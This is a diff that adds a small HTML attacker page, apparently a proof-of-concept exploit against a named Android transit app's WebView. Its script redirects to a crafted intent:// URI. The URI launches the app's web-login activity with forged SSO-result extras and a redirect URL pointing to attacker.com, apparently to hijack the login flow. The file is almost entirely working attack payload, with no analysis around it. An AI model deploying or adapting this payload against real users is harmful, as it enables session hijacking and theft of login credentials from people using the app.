@@ -1,0 +1,13 @@
+<!doctype html><html><body>
+<h1>ATTACKER PAGE INSIDE THE VIA APP WEBVIEW</h1>
+<script>
+setTimeout(function(){
+ location.href =
+  "intent://172.19.0.1:8000/ssocallback?code=ATTACKER#Intent;scheme=http;"
+ +"component=ridewithvia.par.piercetransit/via.rider.activities.WebLoginActivity;"
+ +"B.via.rider.activities.BaseWebViewActivity.EXTRA_IS_SSO_LOGIN_RESULT=true;"
+ +"B.via.rider.activities.BaseWebViewActivity.EXTRA_RESPONSE_MODE=true;"
+ +"S.via.rider.activities.BaseWebViewActivity.EXTRA_REDIRECT_URL=http%3A%2F%2Fattacker.com%2Fssocallback;"
+ +"end";
+},3000);
+</script></body></html>
